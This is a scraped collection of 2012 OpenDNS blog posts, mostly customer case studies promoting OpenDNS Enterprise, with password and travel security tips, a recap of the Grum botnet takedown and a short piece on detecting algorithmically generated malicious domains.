learned about myself.  OpenDNS has proved to me that the tech industry has room for everyone, regardless of your skill set or field of study.  I am not a computer programmer, nor will I ever be, but this internship has given me the confidence and passion to pursue a career in an industry that I previously considered to be off-limits.  For the first time in my life, I have a sense of clarity and direction as I think about my future, and I owe it all to the talented, hard-working people at OpenDNS.  I am so grateful to have had this experience, and I’m genuinely sad to see it come to an end.\nThank you, OpenDNS, for the best summer of my life.', 'Field Reports', 'https://umbrella.cisco.com/blog/2012/08/30/the-intern-tells-all-my-summer-at-opendns/');

Our libraries rely on e-rate funding that comes from meeting CIPA compliance, so we can’t afford issues with our Internet security program.”\nThe Luzerne County Library System selected OpenDNS Enterprise for a painless and lightweight approach to Network security and Web filtering. Juanita says it best: “OpenDNS Enterprise can block inappropriate and malicious content before it ever hits our network, so I’ve been able to uninstall heavy filtering software. This has saved my team and I from spending hours trying to resolve software problems, and has allowed us to focus on more pressing technical issues facing our libraries.”\nWe’re thankful to be the choice of so many libraries that use OpenDNS to meet CIPA compliance and keep their communities safe online.

Many incidents of hacking could be stopped by integrating a company’s security team into the IT decision making process, giving end users good security-awareness training and preforming routine penetration tests on the network.\nOpenDNS: If you could give businesses just one piece of advice for improving security, what would it be?\nGamblin: I would tell them to implement a real security-awareness program. A security-awareness program that belittles the intelligence of employees, ignores personal computing or pretends security awareness training is a one-time thing just doesn’t cut it.

Pretending to be Honan, the hackers contacted AppleCare support to reset his password. They were able to bypass the security questions by providing Honan’s email address, billing address, and last four digits of his credit card number which they had obtained from his Amazon account. Once they gained access to his iCloud account, they proceeded to remotely wipe his iPhone, iPad, and Macbook one by one along with his Gmail account. Honan’s personal and Gizmodo Twitter profiles were also connected to his iCloud account, and therefore were also compromised in the attack.\nOn his personal Tumblr, Honan stated that he has been in contact with Apple and Google since the attack to try to recover his data and make sure this doesn’t happen again. He also got in contact with DriveSavers, a data recovery company, who were able to recover data from his MacBook Air, making the painful situation, a little less painful.\nIn response to the attack, Apple put a temporary freeze on over-the-phone password verification to determine what changes, if any, needed to be made to their current security policies. Amazon responded by stating it will no longer allow customers to change account settings over the phone.\nWhat can you do to protect yourself from similar attacks?\nFor one, you can disable iCloud services on your Mac and iOS devices. But what’s the point of having a device with cloud features if you can’t use them without constantly worrying? There is a risk with everything in life, but you take the proper measures to lessen the risks by securing your cloud security with these seven useful tips:\nUse strong, alphanumeric passwords and change them frequently.\nNever use the same password for more than one service.\nUse two-factor authentication wherever possible. Two-factor authentication is a process in which a user provides two forms of identification to prove who they are. Common forms of identification used include security codes, bank cards, or phone numbers. Using two-factor authentication significantly reduces the probability that someone could gain access to your information.\nCreate individual accounts for each family member instead of sharing access to prevent multiple accounts from being compromised and exposed.\nAlways choose security questions in which the answers aren’t easily guessed or researched through public records.\nAlways keep a local backup of your data in addition to cloud backups.\nDisable services such as “Find my Mac” unless you are traveling or are in a situation in which your laptop might be lost or stolen (which is unlikely if it is always kept at home).\nIf you have any other useful tips for protecting yourself, we’d love to hear them.

However, many have much smaller data sets to work with as their technology is limited to a few threat vectors such as email or Web traffic. Many lack real-time, cloud-based data collection systems. Almost all lack an Internet-wide routing network to help analyze the context of the data collected.\nOpenDNS’s technology platform enables us to collect data on this long tail across every threat vector, in real-time, in the cloud using our Internet-wide Anycast routing network. However, it’s difficult for researchers to observe malicious linkages between seemingly unrelated objects using an Internet-sized data set. Visualizing big sets of data by different attributes enables patterns to be more easily characterized. However, more sophisticated techniques than frequency counts of DNS queries are required to identify domains as bad or suspicious.\nOne such sophisticated method is by tracking the ASN (Autonomous System Number) associated with every domain name our recursive DNS servers have resolved via the IP routing prefixes that we can associate using our Anycast network and the IP addresses listed in its DNS records. We can reverse the process to link domain names by their ASN.\n\nVisualizing Threat Patterns\nIn our previous blog post, we observed the increasing use of algorithmically generated domain names (aka. “DGA”) used by malicious software to phone home to botnet controllers. There are a several [obvious] characteristics of the names themselves to set them apart from legitimate domains (e.g. character length, randomness).\nOpenDNS security researchers have developed heuristics to detect such characteristics using lexical analysis and Shannon’s information theory entropy analysis coupled with big data manipulation. However, this alone can only identify a domain as suspicious. Therefore, our researchers built and/or customized several visualization engines that correlate additional domain attributes. These engines enable us to observe clusters sharing other similar characteristics. We’ll share three case examples below.\nCASE #1\n\nSeveral hundred suspicious domain names were clustered together since they all mapped to the same IP address, which by itself is still nothing more than suspicious. The following screenshot shows a few of these.\nAll the suspicious domains were created on the same date (01 Aug 2012).\nWhile “whois” information indicates they’re all registered by different people, after a closer look, the registrant’s email addresses share the pattern of facbani[digits]@hotmail.com. The following screenshot shows this across three different domain registrations.\n\nThis IP address shares the same ASN as a large number of other malicious domain names registered in the past and present.\n\nPurposely faked domain registrants all occurring on the same date and connected with past and present malicious domains is enough to confidently flag these domains as malicious to protect OpenDNS customers.\nCASE #2\n47 suspicious domains were clustered together because they triggered our DGA heuristics via a very restrictive threshold setting.\nBy observing DNS query trend analysis, there is a strikingly uniform time series pattern over a week’s long time window.\n\nAll the domain names had non-existent DNS records; meaning they could not be resolved to an IP address.\nWe’re able to flag these as “likely bad” since our hypothesis is that these are DGA domains, but not yet registered by the cybercriminal. We will soon be releasing a new category for OpenDNS customers to block such domains that we believe, but are not certain, are malicious.\nCASE #3\nSeveral suspicious domains were clustered together due to being densely clustered by IP, thus ASN (6539, 15418), and name servers (e.g., skyhi.mobi, tnsdns.net).\n\nVisual inspection of a few of these domains were observed to be parked domains. They could possibly be URL forwarding services for profiteers, but not cybercriminals.\nThese domains will remain flagged merely as suspicious.\nManaging Security Risks\nAs the number of correlated domain attributes characterized as malicious or suspicious increase, the confidence our researchers and/or automated systems have to flag a domain name increases. This is a continuous proactive system, so as new data is collected and patterns are detected, the extra intelligence is used to update the domain flag accordingly.\nToday, our security settings include “Malware”, “Botnets”, “Phishing” and “Suspicious Response”.

Here at OpenDNS, we know that it takes a lot of hard work and planning to make any vacation a success, but with the proliferation of unsecured Wi-Fi hotspots, costly security breaches, and our growing dependence on personal, Internet-connected devices, we hope that online security doesn’t get left off of your travel “to-do” list.  Follow these three easy steps ensure that no matter where you travel, your devices are protected and the only thing on your mind is spending quality time with those you care about.\n\n1) Set up OpenDNS on individual devices.\nWhether you’re sitting by the hotel pool, driving across the country or flying around the world, you shouldn’t have to worry about your children being exposed to inappropriate or malicious online content while they’re away from your home network.  By setting up OpenDNS at the device level for tablets and laptops, you’re able to adjust and monitor your children’s network settings no matter where they are.  Setup is easy, and OpenDNS can be up and running in a matter of minutes, giving you the same reliable protection and peace-of-mind that you enjoy at home.  With OpenDNS enabled on your devices, you’re always in control of your network, even when you’re on vacation. Learn more about Parental Controls.\n2) Make sure to password protect your devices.\nFor many of us, our personal, Internet-connected devices are the same ones that we rely on at work.  As BYOD continues to gain popularity in the workplace, our devices become more and more valuable as they store both personal and professional information. But with so many distractions while traveling, it’s easy for a phone or laptop to get left behind or stolen.  The thought of corporate and personal data falling into the wrong hands is daunting, but it can be avoided by password protecting all of your devices.  Though this may seem like a no-brainer, statistics on lost and stolen devices reveal that most people don’t take this first, basic security measure.  Password protection is a great idea anytime, but especially if you’ll be on the go, as it gives your devices and information a safety net should they happen to make an unexpected detour during your trip. Learn more about creating secure passwords.\n3) Download DNSCrypt on your laptop.\nWe know how tempting it is to connect to unsecured (and often free!) public Wi-Fi networks at airports and hotels when you’re on the road.  However, it’s important to remember that these networks provide cyber-criminals with the perfect opportunity to get their hands on valuable personal information from unsuspecting Wi-Fi users.  This summer you can avoid the risk of having your information compromised by installing DNSCrypt.  DNSCrypt is a piece of lightweight software designed to boost privacy and security online.  It works by encrypting all DNS traffic between the user and OpenDNS, preventing any spying, spoofing or man-in-the-middle attacks.  Keep in mind that DNSCrypt is still a preview release, so installation is best left to techies.

Despite numerous reports of leaked passwords and credit card data, ninety percent of the computer-based attacks targeted classified systems.  Therefore, simply relying on firewalled networks provides a false sense of security and companies need to work on being more proactive and taking further measures to ensure proper protection.\nHenry offered several techniques to defend data from security threats, one of which involves setting up “traps” that trick hackers into stealing fake data while storing sensitive information behind multiple layers of security.\nHe ended his presentation with a few words of encouragement to the troops: “You have a responsibility and an obligation to your company, to your customers, to your families, to your co-workers.

Both CnC servers were responsible for feeding spam instructions to their zombies, however, since the servers were taken offline, zombies could not access new instructions, preventing them from sending more spam.  The remaining servers were located in Panama and Russia.\nThe next day, the server in Panama became inactive after an ISP took action due to mounting pressure from the community.  The bot herders immediately reacted by replacing the two Dutch servers with six new servers located in the Ukraine, making it increasingly difficult to shut it down.  Information was quickly passed on to the appropriate people in the Ukraine and Russia and by 11AM PST on July 18, all six of the new Ukraine servers, and the original Russian server were effectively dead.\nGrum was a 4-year-old botnet that accounted for 17.4% of worldwide spam traffic, making it the world’s third most active spam botnet. The demise of Grum was accomplished by the cohesive teamwork of security researchers.  According to Atif Mushtaq, one of the researchers, the collaboration sends a strong message to all spammers:\n“Stop sending us spam. We don’t need your cheap Viagra or fake Rolex. Do something else, work in a Subway or McDonald’s, or sell hotdogs, but don’t send us spam.”\nWhat does this all mean for email users?\nAccording to Mushtaq, now that Grum has been dismantled, 50% of worldwide spam is gone with it, a dramatic decrease.  Grum spammers reportedly generated about 18 billion spam emails daily.\nAdditionally, according to a recent statistic before the takedown, Grum infected about 120,000 computers to generate spam every day.  Immediately after Grum was destroyed, the number fell to 21,505.  As of Thursday, the latest data found zero infected machines.\nHas your inbox seen less spam the past few days?', 'Security 101', 'https://umbrella.cisco.com/blog/2012/07/27/noticed-less-spam-lately-this-could-be-why/');

For this edition of Field Reports, we spoke with GCS IT director Cole Conrad about why OpenDNS Enterprise is the perfect fit for a school system dedicated to using technology to enhance the learning process.\nOpenDNS: Your district’s philosophies surrounding technology are definitely cutting edge. Tell us a bit about your approach.\nCole: Our belief in the use of technology as a tool to engage and deliver the most comprehensive learning environment to our scholars is what drives much of our data-driven model and allows us to focus more on the scholar and less on the items that can slow things down (such as paperwork). This applies on both ends of the spectrum, from our 1:1 Macbook program to our use of cloud-based and hosted services whenever possible.\nOpenDNS: You were in the market for a more comprehensive security solution to protect your schools’ networks. What exactly were you looking for?\nCole: Since we have three schools and more than 1,000 devices that rely on our networks, we needed a solution that would protect students and staff even when they were outside the local network. Specifically, we were looking for a solution that would ensure that Web-based distractions and adult content would never make it into our network. We also needed a way to ensure that malware wouldn’t be able to spread across our networks and disrupt the learning process.\nOpenDNS: How does OpenDNS Enterprise’s malware protection and Web filtering make your life easier?\nCole: Since we deployed OpenDNS Enterprise, we are no longer worried about things slipping into our network that shouldn’t be there. Thanks to the Web-based Dashboard, my IT team can filter and manage content even when they aren’t in the office. Malware issues are now also a thing of the past. OpenDNS Enterprise has us covered by preventing malware before it can even hit our network, allowing my team and I to focus more on the needs of the students and less on chasing down malware and filtering issues.\nOpenDNS: Has OpenDNS Enterprise been a good fit for your school?\nCole: Absolutely. Not only does OpenDNS Enterprise provide solid malware protection and Web filtering, but it also accommodates our school system’s plan for rapid expansion over the next few years. We intend to grow to over 5,000 devices and because OpenDNS Enterprise is easily scalable, I have no worries about using the service through this and any future growth.\nOpenDNS: As an IT expert, what are your favorite features of our service?\nCole: I love that OpenDNS Enterprise is remotely accessible, adjustable and easily configured. The service is a prime example of a SaaS product as it should be built, and it’s simple enough that I’d walk my parents through it over the phone if they needed it. I also love the ease of use for implementation. It took me 10 minutes to get OpenDNS Enterprise set-up to secure our network.\nGet more information about how OpenDNS can work for your school.', 'Field Reports', 'https://umbrella.cisco.com/blog/2012/07/25/field-reports-how-opendns-enterprise-ensures-a-safe-learning-environment-despite-rapid-growth/');

For those of you aspiring makers out there, we’ve documented the process in photos below.\n\nThe acrylic is covered with transfer paper, the outline is laser-cut, and then the paper is laser-cut with a lower intensity to create our mask.\n\nSections of transfer paper are peeled back, and then a layer of paint is applied to the exposed acrylic.  More mask is pulled up, and more paint is applied for each color.\n\nThis paint layer will result in the glowing orange SA badge worn by our SysAdmin superhero.\n\nThe prototype of what will become the acrylic base, housing the Arduino Uno and LCD display.\n\nThe smoke-frosted acrylic base is assembled with screws and t-slots, allowing you to take it apart and add more hardware if you’d like.\n\nThe award is powered by an Arduino Uno, attached to an ethernet shield and a third custom-built interface shield.\n\nThe attached display shows the award and, when attached to a network, its own IP address. The board text and LED color can then be set via HTTP.\n\nThe SysAdmin superhero in all of his glory. Want one? Enter the 2012 SysAdmin Awards today.\nSo what will the award do?

We extended an early release to customers that include globally-distributed enterprises, educational institutions and organizations with large, public and guest Wi-Fi networks. That’s why we couldn’t wait to share the story of the Jackson Municipal Airport Authority (JMAA) team, one of the earliest adopters of OpenDNS Enterprise Insights.\nThe JMAA IT team’s monumental responsibilities, in addition to network security, include managing everything from flight systems displays to desktop computers for Jackson Municipal Airport. JMAA was previously using a server-based Web filtering solution from Websense, but the small team was frustrated with the amount of time it took to manage. They started looking for a cloud-based solution for keeping malware off the network that wouldn’t require patches or updates. OpenDNS Enterprise Insights is an ideal solution for JMAA, as it allows the team to identify the source of attempted malware downloads on the network and take action.\nOf course, we prefer to let Shawn Hanks, IT manager for JMAA, explain it in his own words. He said, “OpenDNS Enterprise does a great job of showing us that someone on the network is trying to access a site with malware – and more importantly – preventing it. Through OpenDNS Enterprise Insights and the Active Directory integration we can immediately identify which machines are attempting to access the malicious site and at what time.” This powerful intelligence means the JMAA team is empowered to immediately take action on the network.\nWe’ve always had a firm commitment to making products that are easy to deploy and simple to manage. Shawn tells us that OpenDNS Enterprise Insights is no exception: “I’ve been extremely pleased with the product. I was able to make a couple of DNS changes on the server, setup our IP range online, and it instantly started protecting our network. The simplicity of the product allows me to focus my time and energy on other tasks.”\nIf you’d like to join us for a demo of OpenDNS Enterprise Insights, sign up here.', 'Field Reports', 'https://umbrella.cisco.com/blog/2012/07/18/field-reports-thoughts-from-an-opendns-enterprise-insights-early-adopter/');

So, as I chatted with our own SysAdmins about the many personal hardware hacking projects they were working on it hit me: I could make the edge-lit SysAdmin Superhero concept amazing by making it controllable over the network. Thus, the idea for this year’s SysAdmin Award trophy was born. The trophy will be an acrylic SysAdmin Superhero that includes an LCD on the front and an Arduino web server to control the LED’s brightness and color so the SysAdmin Superhero’s crest glows differently. It will be hackable, and I’ll post the code so the winning SysAdmins can play with it and improve upon it.\nWhat really will make this trophy special is that our winning SysAdmins will be able to set up scripts to change the color of the glowing SysAdmin Superhero or  make it blink when there are new alerts. They can use it to notify them of code pushes, or even set up a script to remind them that it’s time to head to the kitchen because lunch has arrived. It could even be a bat-signal for when something is wrong, an ambient notification mechanism or dozens of other uses we haven’t even considered.\nOf course, it still has to look amazing. So, OpenDNS engineer and uber-maker Jessica G. joined the project to craft our SysAdmin Superheros. Maker details: Jessica G. has worked out a technique of laser cutting acrylic along with a paint mask to allow her to accurately spray the four colors onto clear acrylic. The first prototype is done and next iteration will be bigger with an etched and textured center as to better refract the LED’s glow. While Jessica is taking on the monumental task of laser cutting, masking and painting our heroes, I am working on the hardware and software.\nWe’ll be posting a “how-to” blog article in the coming weeks so stay tuned.

With Enterprise Insights, OpenDNS is now an end-to-end security network of threat discovery, containment and mitigation. You can see, down to the very device where an infection has occurred, any malware instances on the networks you manage. This is phenomenal functionality for a cloud-based service that requires zero hardware or client software to deploy and manage.\nThere are a few things we’d like you to know about the new service.\n\nDeploying OpenDNS Enterprise Insights will make your network and data dramatically more secure. OpenDNS provides services to more than 50 million people around the world every day. They’re in homes, 1 in every 3 U.S. public schools and Fortune 100 enterprises, alike. This is a rich well of security data that allows us to track and analyze advanced malware and botnet threats across the Internet by constantly analyzing troves of DNS data. With OpenDNS Enterprise Insights, we block malware and contain botnets so devices don’t get infected, and most importantly, we prevent infected devices from communicating out with their command and control or leaking your sensitive data. Historically, this type of functionality was only possible through a combination of heavy hardware appliances and often complex software installed on every machine.\n\nDeploying OpenDNS Enterprise Insights will make your job easier. Deployment doesn’t take weeks or months the way it used to with legacy security solutions.  OpenDNS can be deployed across an enterprise in a single day, entirely through the cloud. You can change settings over the Web, for one office or one thousand offices, and all updates to the service are made automatically.\nWe’re delivering Enterprise Insights in direct response to customer demand. OpenDNS has been tested exhaustively by some of the largest companies in the world, and in almost all cases, the service is chosen over competing services. But there’s been just one lingering reason OpenDNS hasn’t met the needs of some organizations: a lack of AD integration. We heard you loud and clear and today we deliver. There are already nearly 60,000 workers using Insights as part of a trial we’ve been running for the past few months and the floodgates open today for any customer interested.\nThis is just the start. This is the initial foundation for providing granular user, group, and device-based services.  We intend to support other authentication and directory services in the future, and look forward to continuing our mission of providing a secure Internet experience across any device, anywhere, anytime.\nOpenDNS Enterprise Insights is available immediately.

It’s a huge badge of honor to wear. So who are they and what do they do?\nTo better explain what a moderator does, let’s quickly revisit the process for how domain categorization works. First, someone submits a domain (or website) to be classified into the most appropriate of OpenDNS’s 58 categories. Users then vote on how the domain should be categorized.  After a certain voting threshold is reached, which varies from category to category, the moderator steps onto the scene. Moderators thoughtfully review the websites, with their keen eyes and Internet prowess, and make a final decision on categorization, with a final review by OpenDNS. The domain is then “tagged” in the appropriate categories and blocked for anyone who has chosen to enable filtering of that category.\nSo what does it take to be a moderator? Well, you don’t necessarily need a Ph.D. in computer science, a job at NASA or fluency in HTML. Our current team of moderators is made up of people from nearly every profession, including (but not limited to) OpenDNS staff members, SysAdmins, software engineers and stay-at-home parents. And OpenDNS moderators live in places all over the world, including India, Brazil, Italy, Canada, Switzerland. What they all have in common is a single passion for making the Internet safer by working together to ensure speed and accuracy in the domain tagging process.\nIf you think you’re a good fit, and want to have a vested interest in making the Internet a safer place, simply fill out the form below and we’ll contact you soon.

In this edition of Field Reports, we look at why they chose to replace their SonicWALL solution with OpenDNS Enterprise.\nBefore switching to OpenDNS Enterprise the company’s network was plagued by bottlenecks, inefficient malware protection, and inconsistent Internet performance across its 13 locations. They went in search of a lightweight and less complicated way to filter Internet traffic, with hopes it would speed up their network and provide an improved approach to malware protection.\nNHLD selected OpenDNS Enterprise for a variety of reasons. First, an easy-to-setup trial of the service proved that it does exactly what it claims. Second, multiple features including Block Page Bypass, customized black/whitelists and email notifications make Web filtering management and reporting a breeze. Third, because Web filtering categories and malicious domains lists are updated in real time through the cloud, the NHLD IT team no longer has to worry about spending time on software upgrades or manual updates. Finally, OpenDNS Enterprise allowed NHLD to add a scalable layer of proactive Internet security for a very low total cost of ownership.\nWilliam Silliman, CTO for NHLD, had this to share: “OpenDNS Enterprise is the ideal platform to accomplish Web filtering and malware protection as the DNS-based service has little-to-no installation requirements for all our systems. We went from a Web filtering solution that was cumbersome and slowed Internet services to a solution that works at the speed of the Internet.”\nSilliman and his team are thrilled with the speed, ease, and reliability of OpenDNS Enterprise.  The switch has allowed the company to more efficiently allocate its valuable IT resources as well as properly manage and secure the company’s 13 locations. Silliman tells us, “OpenDNS Enterprise just works. In addition to freeing up my IT team’s time, it has also lowered our blood pressure.

Because the company is driven wholly and completely by Internet activity, and employees are continuously accessing foreign or unfamiliar sites, they are at a significantly high risk of encountering a malicious site and inadvertently downloading malware. It is a major priority for us to ensure our employees are working in a safe environment, and that our networks remain protected.\nOpenDNS: When you were looking for a new malware protection solution, why did you look at OpenDNS?\nMichiel: We were running desktop antivirus software on individual machines, but malware was still sneaking in, requiring costly and time-intensive clean-up. I trust OpenDNS at home, so I wanted to look into the business solutions to see if they could work for our offices.\nOpenDNS: What did you discover during your trial of OpenDNS Enterprise?\nMichiel: OpenDNS Enterprise is an ideal fit for our company. The service is continually updated in real-time, so there are no software updates or lag time for installations or upgrades, and as soon as new malicious sites are identified our employees are automatically protected. We’re very happy with it.\nOpenDNS: How have things changed for your team since you deployed OpenDNS?\nMichiel: The solution makes it easy for us to share insights between multiple members of the team, and in turn that helps us collaborate and share responsibilities. From anywhere, any member of our team can monitor network statistics, update settings, or even deploy new networks.

Most people use passwords for various different things, including to log in to their computer, email, instant messaging clients, social networks and online banking.  And that’s just the tip of the iceberg.  The average person is guaranteed to encounter having to enter their password(s) several times throughout a typical day.  And with the recent security breaches that have taken place at LinkedIn and eHarmony, this is probably a good time to go over some good password tips and advice.\nOne of the biggest problems people have with passwords is the fact that they are too weak.  What does that mean?  If your password is one of the top five most common passwords, “123456,″ “12345,″ “123456789,″ “password” or “iloveyou,” it is time to change it.  Additionally, if your password is a word that can be found in the dictionary — it is time to change your password.\nWhy, you ask?  Research has shown that in many cases, an account can be broken into within 150 attempts to crack the password.  As people start storing more sensitive and important data online and on computers that are connected to the Internet, it’s very important that security is a top priority for everyone.  This includes the account owner (you) and the company/website (Google, Facebook, Bank Of America) where the account resides.\nSo what types of passwords should be avoided at all costs?  Standard English words as password are always a no-no.  This gives people with malicious intent the ability to use a method known as a dictionary attack, in which every word in the dictionary is systematically tried as a user’s password until they find the one that works.  Any password that is fewer than six characters should be avoided as well, as computers today are very powerful and can run millions of different password combinations fairly quickly.\nHow do you create a good password?\nGood passwords typically are at least eight characters (the more characters the better) in length and include upper and lower case letters, numbers and special characters, such as the dollar sign, ampersand or the at (@) symbol.  Doing so will make it much more difficult for someone to guess or systematically crack your password, and ultimately helps to keep your account safer.  Ideally, you should never use the same password twice or at the very least use a different password for your bank/credit card account than you do for everything else.\nWhile committing several different passwords may sound like a daunting task, password management solutions such as 1Password, Passpack, and LastPass can help you make the process of storing your passwords a much simpler task.  If you need help creating a good password check out GRC’s Perfect Password and PC Tools Secure Password Generator.\nPerhaps most importantly of all, be smart with your password.  Don’t share it or give it out to people or unfamiliar websites and if possible avoiding logging to bank or credit card accounts on public computers.', 'Community;Security 101', 'https://umbrella.cisco.com/blog/2012/06/19/are-your-users-passwords-secure-enough/');

That’s because when you manage the networks for dozens (or in this case hundreds) of businesses, the volume gives you the ability to identify problematic trends. In this edition of Field Reports, we take a look at how iVenture, one of Florida’s leading MSPs, was able to reduce malware incidents by 80 percent across many of the client networks they manage by switching to OpenDNS Enterprise.\nIVenture, which manages networks for more than 400 companies, was seeing skyrocketing growth of malware on its clients’ networks.  Gray Mabry, CEO of iVenture, told us that the average rebuild time for a PC from start to finish is about a half-day of downtime, which can amount to considerable loss in productivity or sales for a client.\nSince the team at iVenture prides itself on a phenomenal attention to client uptime, they were searching for a way to ensure that productivity is never lost due to IT issues. The team chose to deploy OpenDNS Enterprise across multiple client networks as part of a defense-in-depth strategy.\nGray explains, “We’ve seen an 80 percent decrease in malware on the networks that are using OpenDNS Enterprise. Our clients’ uptime means everything to us, and OpenDNS Enterprise helps us make sure no time or devices are lost to crippling malware infections.”\nUnlike traditional malware protection solutions that require network administrators to identify and clean up malware once it’s already infected a machine or spread across the network, OpenDNS Enterprise prevents users from reaching malicious sites, so they can’t download malware to begin with. The service also disables communication between infected devices and their online command and control centers, hence rendering the malware harmless.\nAnother interesting trend the iVenture team has been negotiating is the growth of bring your own device or BYOD. The phenomenon has left many network administrators questioning how to enforce security policies without infringing on user sovereignty. Because OpenDNS Enterprise is a cloud-based solution, it is uniquely capable of protecting all devices that come onto a corporate network without any additional software or hardware to install. This not only ensures that the corporate network is protected from outside threats, but also that users retain their privacy and avoid the enforcement of strict policies on their personal devices\nAs Grey explains, OpenDNS Enterprise is making everyone happier. “We manage a great deal of BYOD or employee-owned devices for our customers. OpenDNS Enterprise is a powerful layer of protection for the corporate networks we manage that allows us to secure all devices, even those that aren’t company owned, without forcing users to install software on their personal PCs. It makes the solution appealing not just to our clients, but to their employees as well.”\nYour turn: What security challenges has BYOD presented for your organization?

To get a sense of how small businesses are using OpenDNS Enterprise, we’d like you to meet TrialCard. The rapidly-growing company recently replaced its Symantec (MessageLabs) solution with OpenDNS Enterprise for more efficient Web filtering and malware protection.\nTrialCard provides solutions to the pharmaceutical industry to improve access and affordability of their medicines to patients. TrialCard’s small-but-effective IT team prides itself on not just being highly responsive but, more importantly, highly proactive. So when the team determined its Symantec (MessageLabs) Web filtering solution couldn’t keep up with the organization’s rapid pace, it was time for a change.\nBrandon Sabol, TrialCard SysAdmin explains it best: “We had already tried a few so-called cloud-based solutions but they didn’t offer the ease-of-management and deployment that we were looking for. Our business moves very fast and we wanted something that was not a lot of hassle to get up and running and that any member of our team could easily understand.”\nFor the TrialCard team, the best part about OpenDNS Enterprise is that the solution didn’t require much change to TrialCard’s architecture or any additional resources for management. They now spend very little time managing a Web filtering program and cleaning up malware infections and they’ve reported immediate savings on IT time and resources.\nBrandon shared, “At the pace we move, time is a very precious resource and we welcome finding savings wherever we can. OpenDNS Enterprise fits perfectly into our strategy. With no proxy servers and no appliances – it was completely painless for us.”\nIf you’re using OpenDNS at work and want to answer a few questions for OpenDNS, Email us.', 'Announcements;Field Reports', 'https://umbrella.cisco.com/blog/2012/05/30/field-reports-why-an-agile-pharmaceutical-company-switched-from-symantec-to-opendns/');

They are Chief Security Officers at Fortune 50 enterprises, small business owners, parents looking to keep their kids safe online and people who care about having a safer, more reliable Internet experience.\nIt’s a big responsibility to build a service now chosen by 50 million people. That’s a lot of people. Years ago I started getting tapped on the shoulder while doing something like waiting in line wearing an OpenDNS t-shirt. “Hey, I love OpenDNS!” they’d say. It was always an incredibly cool, proud experience for me. At first it only happened in San Francisco, a hub of tech acitivity, and I figured that’s probably why. But then it started happening everywhere I travelled, all over the world. And I knew we were doing something right. Today I’m humbled by the fact that OpenDNS is chosen by 1 in 3 U.S. public schools, is running on half of all college and university campuses and so many businesses and homes.\nAnd we’re just getting started. The culmination of several critical factors is driving massive growth for OpenDNS.\n— First and foremost, demand for a faster, more reliable DNS service, provided by a trustworthy and privacy-sensitive company such as OpenDNS, continues to grow. Individuals want a DNS service they can count on for 100 percent uptime, and businesses and schools want a single, reliable DNS service for all locations that can be managed centrally.\n— Second, OpenDNS has developed pioneering ways to secure Internet connections and offer an unprecedented level of control through the DNS. OpenDNS services have long blocked phishing domains, but today OpenDNS Enterprise uniquely blocks malware and renders existing malware infections unthreatening by preventing infected machines from phoning home to their command and control. This protects users, and helps businesses prevent the leakage of sensitive data from their network. The service is lightweight, easy to deploy and easy to manage. It’s one of the strongest areas of growth for OpenDNS and is being embraced by thousands of academic institutions and businesses, including some of the largest companies in the world.\n— The way in which people access the Internet is changing. No longer do people connect to just one network. Today they connect not just on mobile devices, but to multiple WiFi networks in a single day using multiple devices. DNS is used in all of these access methods and we’re making that easier than ever.\nSome other updates for you (a few of which have already been announced on this blog, but we’ll recap):\n— The lights are on at our beautiful new headquarters: If you’re in the area, drop by and visit our gorgeous new headquarters at 145 Bluxome Street. (A call first would be appreciated.)\n— Welcome OpenDNS Vancouver: Vancouver is a fantastic city, and full of top engineering talent. So it made a whole lot of sense for us to open up shop there. A whole lot of cool stuff if being engineered there, as I type, in fact. And we’re hiring up there, too.\n— DNSCrypt is changing the game: If you consider yourself a technical person, check out the preview of DNSCrypt, the OpenDNS-invented technology that’s laying the groundwork for a safer mobile Internet experience.\n— Strong management makes everyone stronger: I’m thrilled that we can now call Dan Hubbard our CTO (former CTO of Websense), Mark Kreitzman our head of Alliances (formerly same role at Cisco/ScanSafe — and who you should email to partner with us!) and Josh Redner (former sales leader at Good Technologies, AirMagnet and Fluke Networks) our VP of Corporate Sales.\nAs always, this is your OpenDNS.

But imagine running the networks used by 17,500 kids and staff in primary and secondary schools, and attempting to improve security while lowering costs. That could get crazy. In this edition of Field Reports we talk to Anykey IT’s Tobias Linder, whose team manages the networks at 80 schools in Switzerland. He shares how OpenDNS Enterprise helps his team eliminate complexity for their clients.\nOpenDNS: Your company sees the network architecture for dozens of schools across Switzerland. What is one of the biggest trends you notice?\nTobias: When we first started working with schools many years ago, we discovered that they had these incredibly intricate and difficult-to-manage networks. They were developed this way as the result of limited budgets and nearly no IT resources for management. Of course, this makes security somewhat of a nightmare. We knew that in order to be of the most service to schools, we had to find a way to eliminate complexity without increasing costs.\nOpenDNS: What is your strategy for making security and IT more efficient and affordable for the schools you serve?\nTobias: The first thing we recommend is that our clients move services out of the local network and into the cloud. In most cases, abandoning old appliances actually saves the clients money. Cloud-based solutions also allow them to free up IT resources that were previously devoted to maintenance and management of appliances or software. OpenDNS Enterprise is a staple in this program.\nOpenDNS: As an IT solutions provider, you have your choice of dozens of Web filtering solutions. What made you select OpenDNS Enterprise?\nTobias: We fell in love with OpenDNS Enterprise for its simplicity, performance and reliability. Compared with traditional Web filtering solutions, OpenDNS Enterprise offers the ideal intersection of powerful protection and simple management. It comes at a considerably lower total cost of ownership for our customers and the pricing model we use is straightforward and easy to understand.\nOpenDNS: You’ve now deployed OpenDNS Enterprise for 30 schools. What kind of results have you seen?\nTobias:  Right now we’re using OpenDNS Enterprise to protect the networks used by 17,500 students and staff. That’s a pretty huge group, but OpenDNS Enterprise makes management of Web filtering and malware protection a breeze. For schools today, uptime and internet security is crucial. Our clients are very happy with the reliability and flexibility of OpenDNS Enterprise, and so are we.\nTo read more about how Anykey IT is using OpenDNS Enterprise to protect school children in Switzerland, read the full story here.

However, that can make security a monstrous undertaking. In this week’s field reports we take a look at why Regent University selected lightweight OpenDNS Enterprise to tackle network security without placing a heavy burden on IT.\nRegent University is a leading academic center offering rigorous programs and high academic standards. But when it came to blocking malware, the college’s Web filtering solution wasn’t making the grade. The Blue Coat product couldn’t scale with the school’s growth or comprehensively combat its troublesome malware problem.\nWhen searching for a solution, the Regent University IT team begin testing OpenDNS Enterprise. Right away it was clear that the DNS-based security solution was ideal for scaling to serve the large campus. Unlike the Blue Coat solution the school was previously using, OpenDNS Enterprise doesn’t require hardware or software, so it doesn’t create network bottlenecks, and it’s able to uniquely prevent the proliferation of malware at the university.\nAs Jonathan Harrell, Director of Network Engineering for Regent University, explains, “With lightweight OpenDNS Enterprise we can now identify and block malware before users even know how to find it. More importantly, we can easily look at a high-level flyover of all of our networks and identify trends before they become problems. That means we’re preventing malware instead of cleaning it up.”\nSince setting up OpenDNS Enterprise, the university is reporting significantly easier Internet security management and a malware prevention strategy that saves the IT department time and resources. It’s no wonder that OpenDNS 